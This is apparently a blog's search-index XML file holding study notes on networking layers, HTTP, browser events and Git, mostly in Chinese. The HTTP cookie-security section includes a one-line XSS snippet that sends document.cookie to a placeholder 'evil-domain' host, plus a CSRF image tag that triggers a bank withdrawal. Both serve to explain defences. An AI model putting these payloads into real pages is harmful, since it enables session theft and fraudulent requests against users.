<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Understanding Internet Protocol]]></title>
    <url>%2F2018%2F11%2F09%2FNetworks-md%2F</url>
    <content type="text"><![CDATA[Introduction to Computer Netwoks. 全球的计算机通过光缆, 电缆, 双绞线, 无线电波等方式连接起来, 组成了网络, 这些将计算机连接起来的实体位于实体层. 实体层主要规定网络的一些电气特性, 作用是负责传送 0 和 1 的电信号. 计算机上安装的网卡负责发送, 接收这些电信号. 为了解读电信号, 需要规定 0 和 1 的分组方式, 链接层的协议负责规定这些. 每块网卡出厂的时候, 都会带有一个全世界独一无二的 MAC 地址, 长度是 48 个二进制位, 通常用 12 个十六进制数表示, 前 6 个十六进制数是厂商编号, 后 6 个是该厂商的网卡流水号. 以链接层的以太网协议为例, 以太网规定的一组电信号(数据包), 叫做”帧”. 每一帧分成两个部分: 标头(Head)和数据(Data). 标头包含数据包的一些说明项, 比如发送者和接受者的 MAC 地址(假设已经获得了对方的 MAC 地址); 数据则是数据包的具体内容. 标头的长度固定为 18 字节, 数据的长度为 46~1500 字节. 因此, 整个”帧”最短为 64(18+46) 字节, 最长为 1518(18+1500) 字节. 如果数据过长, 就必须分割成多个帧进行发送. 在知道通讯双方的地址的前提下, 理论上只要想全球所有计算机发送数据包, 每台计算机根据包中接收者的 MAC 地址就可以判断是否接收这个包, 从而达到通讯的目的, 显然这种效率低下的方式并不可取. 因此互联网是分成了很多子网, 再将子网连成更大的网络. 为了区分哪些 MAC 地址属于同一个子网络, 哪些不是, 诞生了网络层. 它引入 IP 地址, 使得我们能够区分不同的计算机是否属于同一个子网络. 那么它是如何做到的呢? 目前广泛采用的是 IPv4, 这个版本规定, 网络地址由 32 个二进制位组成. 习惯上, 我们用分成四段的十进制数表示 IP 地址. 互联网上的每一台计算机, 都会分配到一个 IP 地址, 这个地址分成两个部分, 前一部分代表网络, 后一部分代表主机. 子网掩码则被用来确定哪一部份是网络部分, 以 172.16.254.1为例, 子网掩码如果为 11111111.11111111.11111111.00000000, 则网络部分是前 24 位, 主机部分是后 8 位. 将两个 IP 地址与子网掩码分别进行按位取 AND 运算, 如果结果相同就表明它们在同一个子网络中, 否则就不是. 数据先封装成 IP 数据包, 然后将 IP 数据包作为以太网协议的数据部分交由以太网进行传输. 一个 IP 数据包的”标头”部分的长度为 20~60 字节, 整个数据包的总长度最大为 65,535 字节. 因此, 理论上, 一个 IP 据包的”数据”部分, 最长为65,515字节. 而以太网数据包的数据部分, 最长只能容纳 1500 字节, 因此, 如果 IP 数据包超过了 1500 字节, 它就需要分割成几个以太网数据包来发送. 至此, 每台计算机上都有一个 IP 地址和 MAC 地址. 链接层(以太网协议)可以用广播的方式实现同一个子网下的计算机之间的通信. 再加上网络层( IP 议)就可以让互联网中任意两台计算机进行通信. 下面将更详细描述如何做到这一点. 为了达到这一目的, 需要发送方和接收方双方的 IP 地址和 MAC 地址. 当一台计算机开机后它首先要获得一个 IP 地址, 这样接收方的 IP 和 MAC 地址就都有了. 那么如何获得本机的 IP 地址呢? 现在通常是以 DHCP 协议 来动态分配的(通过 DHCP 还能够获得子网掩码, 网关地址, DNS 服务器等参数). 当上层的协议想通过 IP 协议来通信的时候, 会交给 IP 协议对方的 IP 地址(例如, HTTP 通过域名解析获得对方的 IP 地址), 因此在网际层上可以认为已经获得了对方的 IP 地址. 之后通过上文的 IP 与子网掩码按位取与运算可以判断出是否位于同一个子网下. 如果位于同一子网则用 ARP 协议获得对方的 MAC 地址, 否则将接收方 MAC 地址设为网关的 MAC 地址, 也就是说将包发给网关. 网关将作为发送方代理发送这个数据包至更外层的网络. 场景 数据包地址填写方式 同一个子网络 对方的 MAC 址, 对方的 IP 址 非同一个子网络 网关的 MAC 址, 对方的 IP 址 到了网络层, 我们已经可以在互联网中任意两台计算机进行通信了. 接下来的问题是, 同一台主机上有许多程序都需要用到网络, 比如浏览器和聊天程序. 当一个数据包从互联网上发来的时候, 怎么知道它是传给浏览器还是聊天程序的? 操作系统为这些程序分配端口号, 端口是 0~65535 之间的一个整数, 正好 16 个二进制位. 0 到 1023 的端口被系统占用, 用户程序只能选用大于 1023 的端口. 传输层的功能, 就是建立”端口到端口”的通信. 相比之下, “网络层”的功能是建立”主机到主机”的通信. 传输层主要有两个协议 UDP 和 TCP. UDP 协议的优点是比较简单, 容易实现, 但是缺点是可靠性较差, 一旦数据包发出, 无法知道对方是否收到. 为了解决这个问题, 提高网络传输的可靠性, TCP 协议就诞生了. 这个协议非常复杂, 但可以近似认为, 它就是有确认机制的 UDP 协议, 每发出一个数据包都要求确认. 如果有一个数据包遗失, 就收不到确认, 发出方就知道有必要重发这个数据包了. 因此, TCP 协议能够确保数据不会遗失. 它的缺点是过程复杂, 实现困难, 消耗较多的资源. TCP 数据包和 UDP 数据包一样, 都是内嵌在 IP 据包的”数据”部分. 应用程序收到”传输层”返回的数据, 接下来就要进行解读. 应用层的作用, 就是规定应用程序的数据格式. 计算机开机以后, 经由 DHCP 动态分配获得 IP 地址, 子网掩码, 网关地址, DNS 服务器等参数. 在浏览器地址栏上输入 www.google.com. 浏览器会解析 URL, 知道应用层的协议是 HTTP, Web 服务器域名是 www.google.com, 一般还会有请求文件的路径名. 浏览器会根据 HTTP 协议构造请求消息, 请求消息就是浏览器要委托协议栈进行发送的数据. 例如: 123456789GET / HTTP/1.1Host: www.google.comConnection: keep-aliveUser-Agent: Mozilla/5.0 (Windows NT 6.1) ......Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Cookie: ... ... 有了要传输的数据, 还需要接收方的 IP 和 端口. 应用层协议一般有默认端口, 这里 HTTP 默认端口是 80. 浏览器将服务器域名作为参数调用 Socket 库中的 DNS 解析器得到 IP 地址. 接着浏览器需要调用 Socket 库中的函数, 委托协议栈发送消息. 至此, 还需要本方的端口号. 浏览器调用 socket 函数创建一个套接字, 类似这样 &lt;描述符&gt; = socket(&lt;使用 IPv4&gt;, &lt;流模式&gt;, …). 返回的是一个描述符, 当打开了多个浏览器窗口, 同时访问两台浏览器是, 对与浏览器也就有了两个套接字, 描述符就可用来区分不同的套接字. 浏览器才知道要跟哪个套接字打交道. 套接字可以用( IP 址: 端口号)表示. 更具体地, 创建套接字时, 操作系统分配内存空间, 并将所需的通信控制信息(例如双方 IP, 端口号, 通信进行状态等等)写入内存. 之后, 应用程序将数据委托协议栈进行传输, HTTP 主要使用 TCP 协议 进行传输.]]></content>
      <categories>
        <category>Computer Networks</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Understanding HTTP]]></title>
    <url>%2F2018%2F11%2F09%2FHttp-md%2F</url>
    <content type="text"><![CDATA[Introduction to HTTP. 长连接打开一个 TCP 连接, 需要经过三次握手. 在浏览器中打开一个页面, 经常需要连续发送多个 HTTP 请求来请求 CSS, JS, 图片等资源. 如果每次发送一个 HTTP 请求都要打开一个 TCP 连接, 经过三次握手, 效率就比较低. HTTP 1.1 中, Connection 默认设置成 Connection: Keep-Alive, 它表明打开一个 TCP 连接后, 服务器会等待一小段时间再关闭连接, 在这段时间内的请求都会复用这个 TCP 连接. 另外, Chrome 浏览器在请求多个资源的时候会并发地请求, 默认一口气打开 6 个连接, 第六个资源以后的请求要等前六个资源请求完成了空出来连接了才会复用. 缓存与验证在响应消息头中可以设置 Cache-Control.12Cache-Control: privateCache-Control: public “public” 表示该响应可以被任何中间人(比如中间代理, CDN 等)缓存. “private” 则表示该响应中间人不能缓存此响应, 该响应只能应用于浏览器私有缓存中. 12Cache-Control: no-storeCache-Control: no-cache Cache-Control: no-store 表示禁止进行缓存: 缓存中不得存储任何关于客户端请求和服务端响应的内容. 之后客户端发起的请求都会直接到服务器请求资源. Cache-Control: no-cache 表示强制确认缓存: 之后客户端的请求发出时, 缓存会将此请求发到服务器(该请求应该会带有与本地缓存相关的验证字段), 服务器端会验证请求中所描述的缓存是否过期, 若未过期, 返回状态码是 304 Not Modified 的响应消息, 这时浏览器才可以使用本地缓存副本. Cache-Control: max-age=N 是距离请求发起的时间的秒数, 超过这个秒数, 缓存失效. (Expires 响应头是一个日期, 过了这个日期, 响应过期). 缓存验证:一个响应头的例子:123Cache-Control: &apos;max-age = 2000, no-cache&apos;Last-Modified: &apos;20xx-10-01&apos;Etag: &apos;384jskf&apos; 如果缓存响应中的 max-age 过期或者设置了 no-cache, 就要进行缓存验证. 浏览器会构造带有如下请求的请求消息发送给服务器12If-Modified-Since: &apos;20xx-10-01&apos;If-None-Match: &apos;384jskf&apos; 服务器确认资源没有更新就会返回状态码是 304 Not Modified 的响应消息, 这时浏览器才可以使用本地缓存副本, 如果服务器确认资源过期, 则返回更新后的内容. 重定向 301 永久重定向 302 临时重定向 303 See Other. 浏览器访问一个 URL, 如果这个资源更换了地址, 服务端会返回一个状态码是 301(或 302), 请求头带有 Location 的响应消息. 如果状态码是 301, 这个新的地址会被永久缓存, 以后每次输入旧地址, 浏览器会在本地自动更换成新地址, 再以新地址去访问服务器. 如果状态码是 302, 那么表示这个新地址是临时的, 浏览器不会更换成新地址, 仍然以输入的旧地址去访问服务器. 302 是不会改变请求的方法, 如果请求方法是 POST 的话, 重定向的请求也应该是 POST. 而对于 303, 使用 POST 请求的话, 重定向的请求应该是 GET 请求. 典型应用场景: 对于不安全请求的临时响应. 不安全请求会修改服务器端的状态, 应该避免用户无意的重复操作. 一般地, 你并不想要你的用户重复发送 PUT, POST 或 DELETE 请求. 假如你仅仅为该类请求返回响应的话, 简单地点击刷新按钮就会(可能会有一个确认信息)导致请求的重复发送. 在这种情况下, 服务器可以返回一个 303 See Other 响应, 其中含有合适的响应信息. 如果刷新按钮被点击的话, 只会导致该页面被刷新, 而不会重复提交不安全的请求. 对于耗时请求的临时响应. 一些请求的处理会需要比较长的时间, 比如有时候 DELETE 请求会被安排为稍后处理. 在这种情况下, 会返回一个 303 See Other 重定向响应, 该响应链接到一个页面, 表示请求的操作已经被列入计划, 并且最终会通知用户操作的进展情况. 内容协商在服务器上, 一个资源, 连同它的各种展现形式, 可能会共享一个特定的 URL. 客户端可以设置特定的 HTTP 首部, 来获取它想要的形式, 这种叫做主动协商机制. 这些头部常见的有: Accept, Accept-Charset, Accept-Encoding, Accept-Language. Accept 首部列举了用户代理希望接收的媒体资源的 MIME 类型, Accept-Encoding 首部明确说明了(接收端)可以接受的内容编码形式(所支持的压缩算法). Accept-Language 首部用来提示用户期望获得的自然语言的优先顺序. 服务器响应的消息头部则会使用 Content-Type, Content-Encoding, Content-Language 来表明返回的内容的媒体资源的 MIME 类型, 编码形式, 语言. 另外还有一种协商机制: 代理驱动型内容协商机制, 或称为响应式协商机制. 在这种协商机制中, 当面临不明确的请求时, 服务器会返回一个页面, 其中包含了可供选择的资源的链接. 资源呈现给用户, 由用户做出选择. 注意到, 服务器第一次返回的响应消息的状态码 300 Multiple Choices 在这里出现了. 请求消息头部也可以有 Content-Type: 在通过 HTML form 提交生成的 POST 请求中, 请求头的 Content-Type 由 元素上的 enctype 属性指定, 有以下三种: application/x-www-form-urlencoded, multipart/form-data, text/plain. application/x-www-form-urlencoded 数据被编码成以 ‘&amp;’ 分隔的键-值对, 同时以 ‘=’ 分隔键和值. 非字母或数字的字符会被 percent-encoding: 这也就是为什么这种类型不支持二进制数据的原因 (应使用 multipart/form-data 代替). 比如文件上传的时候. 12345&lt;form action="/" method="post" enctype="multipart/form-data"&gt; &lt;input type="text" name="description" value="some text"&gt; &lt;input type="file" name="myFile"&gt; &lt;button type="submit"&gt;Submit&lt;/button&gt;&lt;/form&gt; 请求头看起来像这样:123456789101112Content-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575---------------------------974767299852498929531610575Content-Disposition: form-data; name=&quot;description&quot;some text---------------------------974767299852498929531610575Content-Disposition: form-data; name=&quot;myFile&quot;; filename=&quot;foo.txt&quot;Content-Type: text/plain(content of the uploaded file foo.txt)---------------------------974767299852498929531610575 跨域资源共享(CORS)当一个资源从与该资源本身所在的服务器不同的域或端口请求一个资源时, 资源会发起一个跨域 HTTP 请求. 这个请求会发给服务器, 服务器也会返回响应, 但是响应中如果没有设置 Access-Control-Allow-Origin 来允许跨域的话, 浏览器并不会把它显示出来, 而会报错. src, img 等标签是允许跨域的, 但是由 XMLHttpRequest 或 Fetch 发起的跨域 HTTP 请求则需要服务器端设置消息头来允许 CORS. 另外, 某些情况下, 浏览器必须首先使用 OPTIONS 方法发起一个预检请求, 从而获知服务端是否允许该跨域请求. 这些情况包括使用 Get, PSOT, HEAD 以外的方法, 使用自定义的请求头, 使用 application/x-www-form-urlencoded, multipart/form-data, text/plain 以外的 Content-Type 等等. 一个预先请求的例子: 请求消息头123Access-Control-Request-Method: POSTAccess-Control-Request-Headers: X-PINGOTHER, Content-TypeCredentials: true 响应消息头12345Access-Control-Allow-Origin: http://foo.exampleAccess-Control-Allow-Methods: POST, GET, OPTIONSAccess-Control-Allow-Headers: X-PINGOTHER, Content-TypeAccess-Control-Allow-Credentials: trueAccess-Control-Max-Age: 8000 预请求完成之后, 浏览器才会发送实际请求. Fetch 与 CORS 的一个有趣的特性是, 可以基于 HTTP cookies 和 HTTP 认证信息发送身份凭证. 一般而言, 对于跨域 Fetch 请求, 浏览器不会发送身份凭证信息. 如果要发送凭证信息, 需要设置 Credentials = true CookiesHTTP Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据, 它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上. 通常, 它用于告知服务端两个请求是否来自同一浏览器, 如保持用户的登录状态. Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能. Cookie 主要用于以下三个方面: 会话状态管理(如用户登录状态, 购物车, 游戏分数或其它需要记录的信息) 个性化设置(如用户自定义设置, 主题等) 浏览器行为跟踪(如跟踪分析用户行为等) 客户端数据的存储不再推荐使用 Cookies, 而是建议使用 Web Storage 或 IndexedDB. 创建 Cookie服务器可以在响应头里面添加 Set-Cookie: yummy_cookie=choco, 浏览器请求时请求头上自动带上 Cookie: yummy_cookie=choco. 属性 标记 Secure 的 Cookie只应通过被 HTTPS 协议加密过的请求发送给服务端 标记 HttpOnly 使得 Document.cookie 无法访问 Cookie Max-Age: Cookie 指的是有效时长, Expires 指的是到期时间(不建议使用, 因为系统时间设置可能有问题) Domain 标识指定了哪些主机可以接受 Cookie. 如果不指定, 默认为当前文档的主机(不包含子域名). 如果指定了 Domain, 则一般包含子域名. 例如, 如果设置 Domain=mozilla.org, 则 Cookie 也包含在子域名中(如 developer.mozilla.org). 安全 会话劫持和 XSS: 在 Web 应用中, Cookie 常用来标记用户或授权会话. 因此, 如果 Web 应用的 Cookie 被窃取, 可能导致授权用户的会话受到攻击. 例如使用来窃取 Cookie, (new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie; HttpOnly 类型的 Cookie 由于阻止了 JavaScript 对其的访问性而能在一定程度上缓解此类攻击. 跨站请求伪造(CSRF): 比如在不安全聊天室或论坛上的一张图片, 它实际上是一个给你银行服务器发送提现的请求: 1&lt;img src="http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory"&gt; 当你打开含有了这张图片的 HTML 页面时, 如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效(还没有其它验证步骤), 你银行里的钱很可能会被自动转走. GET 和 POST 区别]]></content>
      <categories>
        <category>Computer Networks</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Browser Events]]></title>
    <url>%2F2018%2F08%2F28%2FEvents%2F</url>
    <content type="text"><![CDATA[Introducton to Browser Events. Assign event handlersThere are 3 ways to assign event handlers: HTML attribute: onclick=&quot;...&quot;. A handler can be set in HTML with an attribute named on&lt;event&gt;. As we know, HTML attribute names are not case-sensitive, so onclick is not case-sensitive. DOM property: elem.onclick = function. We can assign a handler using a DOM property on&lt;event&gt;. As there’s only one onclick property, we can’t assign more than one event handler. To remove a handler – assign elem.onclick = null. Using elem.addEventListener(event, handler[, phase])to add, removeEventListener to remove. Multiple calls to addEventListener allow to add multiple handlers. There are few events that only work with it, for instance transtionend and DOMContentLoaded (to be covered). Also addEventListener supports objects and classes as event handlers. In that case the method handleEvent is called in case of the event. When an event happens, the browser creates an event object, puts details into it and passes it as the first argument to the handler. Some properties of event object: event.type Event type, such as “click”. event.currentTarget Element that handled the event. That’s exactly the same as this. event.clientX / event.clientY Window-relative coordinates of the cursor, for mouse events. The value of this inside a handler is the element. The one which has the handler on it. Bubbling and capturingThe event handling process: When an event happens – the most nested element where it happens gets labeled as the “target element” (event.target). Capturing phase - Then the event first moves from the document root down the event.target, calling handlers assigned with addEventListener(...., true) on the way. Target phase – the event reached the target element. Bubbling phase - Then the event moves from event.target up to the root, calling handlers assigned using on&lt;event&gt; and addEventListener without the 3rd argument or with the 3rd argument false. event.target – the deepest element that originated the event. event.currentTarget (=this) – the current element that handles the event (the one that has the handler on it). Any event handler can stop the event by calling event.stopPropagation(). Almost all events bubble. The key word in this phrase is “almost”. For instance, a focus event does not bubble. Event delegationEvent delegation is often used to add same handling for many similar elements, but not only for that.The algorithm: Put a single handler on the container. In the handler – check the source element event.target. If the event happened inside an element that interests us, then handle the event. Benefits: Simplifies initialization and saves memory: no need to add many handlers. Less code: when adding or removing elements, no need to add/remove handlers. DOM modifications: we can mass add/remove elements with innerHTML and alike. Limitations: the event must be bubbling. Some events do not bubble. Also, low-level handlers should not use event.stopPropagation(). the delegation may add CPU load, because the container-level handler reacts on events in any place of the container, no matter if they interest us or not. But usually the load is negligible, so we don’t take it into account. Browser default actionsThere are many default browser actions: A click on a link – initiates going to its URL. A click on submit button inside a form – initiates its submission to the server. To prevent a default action – use either event.preventDefault() or return false. The second method works only for handlers assigned with on&lt;event&gt;. Dispatching custom eventsCreate a general Event:1let event = new Event(event type[, options]); Arguments: event type - may be any string, like “click” or our own like “hey-ho!”. options – the object with two optional properties: bubbles: true/false – if true, then the event bubbles. cancelable: true/false – if true, then the “default action” may be prevented. By default both are false: {bubbles: false, cancelable: false}. After an event object is created, we should dispatch it on an element using the call elem.dispatchEvent(event). We should use addEventListener for our custom events, because on only exists for built-in events. For some UI Events, such as FocusEvent, MouseEvent, we should use something likenew MouseEvent(&quot;click&quot;) instead of new Event, since they provide specify standard properties for that type of event, like clientX/clientY for a mouse event. For our own, custom events like “hello” we should use new CustomEvent. It provides a second argument detail, which is an object designed for any custom information that we want to pass with the event. We can call event.preventDefault() on a script-generated event if cancelable:true flag is specified. In that case the call to elem.dispatchEvent(event) returns false. Mouse eventsMouse event types: simple: mousedown/mouseup, mouseover/mouseout, mousemove. complex: click, contextmenu(click right mouse button), dblclick(double click). An action may trigger multiple events. For instance, a click first triggers mousedown, when the button is pressed, then mouseup and click when it’s released. The handlers are called in the order mousedown → mouseup → click. Both click and contextmenu trigger mousedonw and mouseup. which allows to distinguish between “right-mousedown” and “left-mousedown”: event.which == 1 – the left button, event.which == 2 – the middle button, event.which == 3 – the right button. All mouse events include the information about pressed modifier keys: shiftKey, altKey, ctrlKey, metaKey (Cmd for Mac). All mouse events have coordinates in two flavours: Window-relative: clientX and clientY. Document-relative: pageX and pageY. We covered events mouseover, mouseout, mousemove, mouseenter and mouseleave. Things that are good to note: Events mouseover/out trigger even when we go from the parent element to a child element. They assume that the mouse can be only over one element at one time – the deepest one. Events mouseenter/leave do not bubble and do not trigger when the mouse goes to a child element. They only track whether the mouse comes inside and outside the element as a whole. A fast mouse move can make mouseover, mousemove, mouseout to skip intermediate elements. Events mouseover/out and mouseenter/leave have an additional target: relatedTarget. That’s the element that we are coming from/to, complementary to target. Keyboard eventsPressing a key always generates a keyboard event.Keyboard events: keydown – on pressing the key (auto-repeats if the key is pressed for long), keyup – on releasing the key. Main keyboard event properties: event.code – the “key code”, specific to the physical location of the key on keyboard. event.key – the character (“A”, “a” and so on), it’s a specific value. Let’s say, we want to handle a hotkey: Ctrl+Z (or Cmd+Z for Mac). We can set a listener on keydown and check which key is pressed – to detect when we have the hotkey. Please answer the question – in such a listener, should we check the value of event.key or event.code? (The answer is event.code.) Page lifecycle eventsPage lifecycle events: DOMContentLoaded event triggers on document when DOM is ready. Images and other resources may still continue loading. load event on window triggers when the page and all resources are loaded. onunload 和 onbeforeunload 两个事件都是在执行页面刷新, 关闭, 浏览器关闭时能触发, onunload 是在服务器上已经读取到数据, 将要替换当前页面时执行, 一般用于当离开页面以后执行的动作. onbeforeunload 是正要向服务器读取新的页面时执行的动作, 此事件执行在访问服务器事件之前, 一般用于提醒你是否要离开页面. document.readyState is the current state of the document, changes can be tracked in the readystatechange event: loading – the document is loading. interactive – the document is parsed, happens at about the same time as DOMContentLoaded, but before it. complete – the document and resources are loaded, happens at about the same time as window.onload, but before it. Resource loading eventsThe browser allows to track the loading of external resources – scripts, iframes, pictures and so on.There are two events for it: onload – successful load, onerror – an error occurred. Only load event when the iframe loading finished. It triggers both for successful load and in case of an error. That’s for historical reasons. Forms eventsForm navigation: A form is available as document.forms[name/index]. Form elements are available as form.elements[name/index], or can use just form[name/index]. Elements reference their form in the form property. For details, you can read the article. An element receives a focus when the user either clicks on it or uses the Tab key on the keyboard. When a user clicks somewhere else or presses Tab to go to the next form field, it triggers the event losing the focus (“blur”). The focus event is called onfocus, and onblur – when the element loses the focus. Methods elem.focus() and elem.blur() set/unset the focus on the element. Events focus and blur do not bubble, but but propagate down on the capturing phase. For delegation purpose, you can use focusin/focusout. Let’s discuss various events that accompany data updates. The change event triggers when the element has finished changing. For text inputs that means that the event occurs when it looses focus, instead the input event triggers every time a value is modified. The submit event triggers when the form is submitted, it is usually used to validate the form before sending it to the server or to abort the submission and process it in JavaScript. To submit a form to the server manually, we can call form.submit(). Then the submit event is not generated.]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Git]]></title>
    <url>%2F2018%2F08%2F11%2FGit%2F</url>
    <content type="text"><![CDATA[Learning note of Git. 开始 配置用户名和邮箱 123$ git config --global user.name &quot;Your Name&quot;$ git config --global user.email &quot;email@example.com&quot;$ git config --list // 查看配置信息 创建版本库 123$ mkdir &lt;dirname&gt;$ cd &lt;dirname&gt;$ git init // 创建一个版本库 当前目录下多了一个 .git 的目录, 这个目录是 Git 用来跟踪管理版本库的, 不要手动修改这个目录里面的文件. 工作区和暂存区 工作区 (Working Directory) 就是你工作的目录. 工作区有一个隐藏目录 .git, 这个不算工作区, 而是 Git 的版本库 (Repository). Git 的版本库里存了很多东西, 其中 .git/index 文件夹称为暂存区, 它实际上就是一个包含文件索引的目录树, 文件的内容并不存储其中, 而是保存在 Git 对象库 .git/objects 中. Git 还为我们自动创建的第一个分支 master, 以及指向 master 的一个指针叫 HEAD. 工作区, 暂存区和版本库都各自维持着一棵目录树, 初始状态三者一致. git add 后同步工作区和暂存区的目录树, git commit 后同步暂存区和版本库的目录树. git diff 比较的是工作区和暂存区, git diff –-cached 比较的是暂存区和版本库的差别, git diff HEAD 比较的是工作区和版本库的差别. git reset HEAD: 暂存区的目录树会被重写为 HEAD 指向的分支的目录树, 但是工作区的目录树不受影响, git reset --hard后工作区, 暂存区的目录树都被重写. git checkout -- &lt;file&gt; 会用暂存区指定的文件替换工作区的文件, git checkout HEAD &lt;file&gt; 会用 HEAD 指向的文件替换暂存区和工作区中的文件. git rm &lt;file&gt; = rm &lt;file&gt; + git add &lt;file&gt; 应用场景 版本回退 每当你觉得文件修改到一定程度的时候, 就可以“保存一个快照”, 这个快照在 Git 中被称为 commit. 一旦你把文件改乱了, 或者误删了文件, 可以从最近的 commit 恢复, 然后继续工作. 要回退到之前的版本, 首先 Git 必须知道当前版本是哪个版本. 在 Git 中, 用 HEAD 表示当前版本, 上一个版本就是 HEAD^, 上上一个版本就是 HEAD^^, 往上 n 个版本写成 HEAD~n. 或者查看 commit id, 1234$ git log // 可以查看所有的历史提交$ git log --pretty=oneline // 更简洁的输出// 输出的 commit id 是一个由 SHA1 计算出来的一个非常大的十六进制数字.$ git reset --hard HEAD^ // 回退到上一个版本 如果我们后悔了, 想回到最后的版本, 则需要知道最后版本的 commit id. 如果使用 git log 是不行的, 因为他输出的只是截至当前版本的历史提交. 12$ git reflog // 记录了每次使用过的指令, 因此可以看到每个提交的 id$ git reset --hard &lt;commit id&gt; // 只需要前几位就可以了 撤销修改 当你对工作区某个文件作了大量改动, 却想全部丢弃工作区的修改时, 可以用命令 git checkout -- file. 当你误删除了一个文件时想要恢复时也可以用 git checkout -- file; 当你不但改乱了工作区某个文件的内容, 而且已经添加到了暂存区时, 想丢弃修改, 第一步用命令 git reset HEAD &lt;file&gt;, 就回到了上面的情况. 分支管理分支策略 在实际开发中, 我们应该按照几个基本原则进行分支管理: 首先, master 分支应该是非常稳定的, 也就是仅用来发布新版本, 平时不能在上面干活; 那在哪干活呢? 干活都在 dev 分支上, 也就是说, dev 分支是不稳定的, 到某个时候, 比如 1.0 版本发布时, 再把 dev 分支合并到 master 上, 在 master 分支发布 1.0 版本: 你和你的小伙伴们每个人都在 dev 分支上干活, 每个人都有自己的分支, 时不时地往 dev 分支上合并就可以了. 所以, 团队合作的分支看起来就像这样: 创建分支 master 指针指向主分支的最新提交, HEAD 指针指向当前分支的最新提交.1234$ git branch &lt;branch&gt; // 创建分支, 也即是创造另一个指针$ git checkout &lt;branch&gt; // 切换分支, 也即是把 HEAD 指向分支指针// 以上两步可以合并成 git checkout -b &lt;branch&gt;$ git branch // 列出所有分支 合并分支 3种合并方式: Fast-forward, non fast-forward, rebase. 如果 master 上没有提交, 这种合并方式叫做 Fast-forward(加上 --no-ff 参数就可以强制用 non fast-forward 方式合并). 如果主分支和分支上都有新的提交, 并且两种提交有冲突, 合并后自动生成一个提交, 需要手动解决冲突, 再提交, 提交后会重新创建合并修改的提交记录, 这种合并方式叫做 non fast-forward. 合并后的历史有分支, 能看出来曾经做过合并, 而 fast forward 合并就看不出来曾经做过合并. 在分支上作完修改并提交后, 要合并到 master 主分支, 需要先切换到 master 分支.12345678$ git checkout master$ git merge &lt;branch&gt; // 合并分支到当前分支// 有冲突需要手动解决冲突// git merge --no-ff -m &lt;message&gt; &lt;branch&gt; 强制使用 non fast-forward// non fast-forward 合并自动生成一个提交, -m 可以添加提交信息$ git branch -d &lt;branch&gt; // 删除分支$ git log --graph --pretty=oneline --abbrev-commit// 可以查看分支的合并情况 reabase 如下图所示, bugfix 分支是从 master 分支分叉出来的. 之后 master 上增加了修改: C 和 D, 而我们的分支想要建立在 C 和 D 的基础上, 也就是说本来我们是基于提交 B 的, 现在想要基于 C 和 D, 这种情况叫做 rebase. 使用 rebase 方法进行分支合并, 会出现下图所显示的历史记录. 首先, rebase bugfix 分支到 master 分支, bugfix 分支的历史记录会添加在 master 分支的后面, 但是此时 X’ 和 Y’ 是从 X 和 Y 复制过来的, 不再是 X 和 Y 了. 如图所示, 历史记录成一条线. 此时如果继续提交 X’ 和 Y’ 有可能会发生冲突, 所以仍然需要解决冲突. rebase 之后, master 的 HEAD 位置不变. 因此, 要合并 master 分支和 bugfix 分支, 即是将 master 的 HEAD 移动到 bugfix 的 HEAD 这里. 1234567$ git checkout bugfix$ git rebase master // 将当前分支 rebase 到 master 分支$ git rebase --continue// rebase 的时候, 修改冲突后的提交不是使用 commit 命令,// 而是执行 rebase 命令指定 --continue 选项.$ git checkout master$ git merge bugfix 应用场景 多人协作 多人协作的工作模式通常是这样: 首先, 可以试图用 git push origin &lt;branch-name&gt; 推送自己的修改; 如果推送失败, 则因为远程分支比你的本地更新, 需要先用 git pull = git fetch + git merge 试图合并; 如果 git pull 提示 no tracking information, 则说明本地分支和远程分支的链接关系没有创建, 用命令 git branch --set-upstream-to &lt;branch-name&gt; origin/&lt;branch-name&gt;. 如果合并有冲突, 则解决冲突, 并在本地提交; 没有冲突或者解决掉冲突后, 再用 git push origin &lt;branch-name&gt; 推送就能成功! 修复 bug 假设你手头上的工作正进行到一半, 这时候接到一个修改 bug 的任务, 利用 git stash 可以把当前工作现场“储藏”起来, 等以后恢复现场后继续工作. 然后到 master 分支去创建 bug 分支, 完成后合并到 master 分支. 最后回到之前工作的分支 git stash pop 恢复工作现场. Feature 分支 开发一个新 feature, 最好新建一个分支; 如果要丢弃一个没有被合并过的分支, 可以通过 git branch -D &lt;name&gt; 强行删除. 标签 命令 作用 git tag [tagname] 对某个提交新建一个标签, 默认为 HEAD, 也可以指定 commit id git tag 查看所有标签 git show [tagname] 显示 tag 的信息 git push origin [tagname] 可以推送一个本地标签 git tag -d [tagname] 删除一个本地标签 git push origin :refs/tags/[tagname] 如果标签已经推送到远程, 要删除远程标签,先从本地删除. 然后用这个命令删除远程标签 Github首先注册一个 Github 账号. 配置 SSH这样 push 时就不同每次都要输入密码. 为什么 GitHub 需要 SSH Key 呢? 因为 GitHub 需要识别出你推送的提交确实是你推送的, 而不是别人冒充的, 而 Git 支持 SSH 协议, 所以 GitHub 只要知道了你的公钥, 就可以确认只有你自己才能推送. 12345$ ssh-keygen -t rsa -C &quot;youremail@example.com&quot;// 生成私钥和公钥, 可以在用户主目录里找到 .ssh 目录, 里面有 id_rsa 和 id_rsa.pub 两个文件// id_rsa是私钥, 不能泄露出去, id_rsa.pub是公钥.$ cat ~/.ssh/id_rsa.pub// 将输出复制到 GitHub 的 Account settings 的 SSH Keys 里. 同步本地 Git 仓库与远程 GitHub 仓库.假设本地有一个仓库, 可以在 Github 上也创建了一个同名仓库, 然后将两者关联起来: 12$ git remote add origin git@github.com:&lt;AccountName&gt;/learngit.git // 关联$ git push -u origin master // 推送 git push 命令实际上是把当前分支 master 推送到远程. 由于远程库是空的, 我们第一次推送 master 分支时, 加上了 -u 参数, Git 